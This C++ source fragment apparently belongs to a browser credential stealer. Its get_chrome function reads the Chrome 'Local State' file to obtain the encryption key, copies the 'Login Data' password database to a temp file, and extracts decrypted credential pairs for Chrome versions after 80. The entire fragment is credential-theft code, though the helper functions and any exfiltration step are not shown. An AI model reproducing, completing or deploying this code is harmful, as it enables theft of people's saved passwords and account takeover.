#include "local.hpp"
#include <filesystem>

void get_chrome(std::multimap<std::string, std::string>& ret)
{
	const std::string orig_db_path = std::string(std::getenv("USERPROFILE")) + "/AppData/Local/Google/Chrome/User Data/Default/Login Data";
	const std::string db_path = std::filesystem::temp_directory_path().string() + "Local DB";
	const std::string config_file_path = std::string(std::getenv("USERPROFILE")) + "/AppData/Local/Google/Chrome/User Data/Local State";
	std::vector<uint8_t> key = chrome::get_key(config_file_path);


	if (std::filesystem::exists(db_path))
		std::filesystem::remove(db_path);
	std::filesystem::copy_file(orig_db_path, db_path);

	//Chrome ver > 80
	chrome::get_pairs_b80(ret, db_path, key);
}